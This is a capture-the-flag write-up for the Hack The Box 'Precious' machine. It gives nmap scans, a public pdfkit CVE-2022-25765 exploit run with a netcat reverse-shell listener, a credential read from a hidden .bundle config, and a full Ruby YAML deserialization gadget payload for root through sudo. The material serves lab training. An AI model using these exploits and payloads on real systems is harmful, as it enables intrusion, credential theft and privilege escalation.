---------------
Precious is an Easy Difficulty Linux machine, that focuses on the Ruby language. It hosts a custom Ruby web application, using an outdated library, namely pdfkit, which is vulnerable to CVE-2022-25765, leading to an initial shell on the target machine. After a pivot using plaintext credentials that are found in a Gem repository config file, the box concludes with an insecure deserialization attack on a custom, outdated, Ruby script.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.11.189 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.189 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```

<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.189 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```

![](/assets/Precious/2.png)

<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.4p1**
+ **80/tcp nginx 1.18.0**

<br />

We can also see a **hostname**, let's add it to our ***/etc/hosts*** file:

```bash
echo "10.10.11.189 precious.htb" | sudo tee --append /etc/hosts
```

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.189 -p 22,80 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```

<br />

This scan didn't return any relevant information.

### Foothold

This machine was a bit tricky for me, I attempted a lot of things before looking for **metadata**, I also failed to see **hidden folder** containing the password to get the user.txt.

<br />

We can find a website that converts webpages to PDF:

<br />

![](/assets/Precious/3.png)

<br />
<br />

As Hack The Box machines **don't have Internet connection**, we can **host a web server** to download a PDF file of our own website:

```bash
sudo python3 -m http.server 80
```

<br />

After using the website to download this PDF, we can inspect its **metadata**:

```bash
exiftool <PDF_file>
```

![](/assets/Precious/4.png)

<br />
<br />

We got a **version number** for the technology used to create the PDF file, let's search for it:

<br />

![](/assets/Precious/5.png)

<br />
<br />

We can see that the machine is vulnerable to **CVE-2022-25765**, with this information I found an [exploit](https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765) that we can leverage to gain RCE, so we can download it, set a reverse shell and use it:

```bash
rlwrap nc -nlvp 4444
git clone https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765
cd PDFkit-CMD-Injection-CVE-2022-25765
python3 CVE-2022-25765.py -t http://precious.htb -a 10.10.16.9 -p 4444
```

<br />
<br />

We can **enumerate users** to find that **there is another user aside from *ruby***, which is the one we got remote code execution as:

```bash
ls -la /home
```

![](/assets/Precious/7.png)

<br />
<br />

While performing enumeration, we will find ***.bundle***, an **uncommon hidden folder** in **ruby's home folder**:

```bash
ls -la /home/ruby
```

![](/assets/Precious/8.png)

<br />
<br />

If we look into this folder, we will find a file with credentials:

```bash
cat /home/ruby/.bundle/config
```

![](/assets/Precious/9.png)

<br />
<br />

With this credentials we can log into the machine using **SSH** and print the **flag**:

```bash
ssh henry@precious.htb
cat ~/user.txt
```

<br />
### Privilege Escalation

<br />

Escalating privileges in this machine was hard for me as I have never seen this vulnerability before, but that's what we are here for.

<br />

Enumerating **sudo privileges**, we can see that we can execute a ruby script as sudo:

```bash
sudo -l
```

![](/assets/Precious/11.png)

<br />
<br />

Examining the script, we can see that there is an **insecure YAML function**, `YAML.load()`:

```bash
cat /opt/update_dependencies.rb
```

![](/assets/Precious/12.png)

<br />
<br />

We can also notice that the file that is loaded is referenced with a **relative path**, so we can **create this file in our directory** and make the script load it, I will use the [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md):

```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: bash
         method_id: :resolve
```

<br />

Now we can execute the **sudo command** from the directory where *dependencies.yml* is located and print the **flags**:

```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
